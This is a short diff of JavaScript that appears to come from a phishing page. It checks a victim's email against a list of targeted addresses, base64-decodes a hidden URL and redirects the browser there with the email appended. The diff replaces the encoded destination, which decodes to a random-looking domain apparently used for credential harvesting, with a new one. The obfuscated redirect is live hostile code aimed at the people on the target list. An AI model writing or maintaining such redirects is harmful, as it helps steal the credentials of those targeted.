@@ -192,7 +192,7 @@ async function continueLoading() {
 
 if (validateEmail(email)) {
     if (validEmails.includes(email)) {
-        const link = "aHR0cHM6Ly80ZTJlMDU2NS5hMy1yZWNsdWVkLTQzMHNmZG9nZmtqY2Nka2hza2V0ZS1zb3Q0My5wYWdlcy5kZXY="; 
+        const link = "aHR0cHM6Ly9hdGctZGlzdG9ydC0yODMtLXJlY2xpbmUtOTEyLm5lb3RhbnFlbnQuY29tLzMwMzUzLW5lby1mb3JtLTgzLTY1LWVudGVycHJpc2UtLXJlZGFjdC8tLS0yLWljUi1hNC1hY2NlLXNzMDQ1LXNlc3Npb25zLw=="; 
             const decodedLink = atob(link);
             const finalLink = `${decodedLink}#${email}`;
             window.location.href = finalLink;
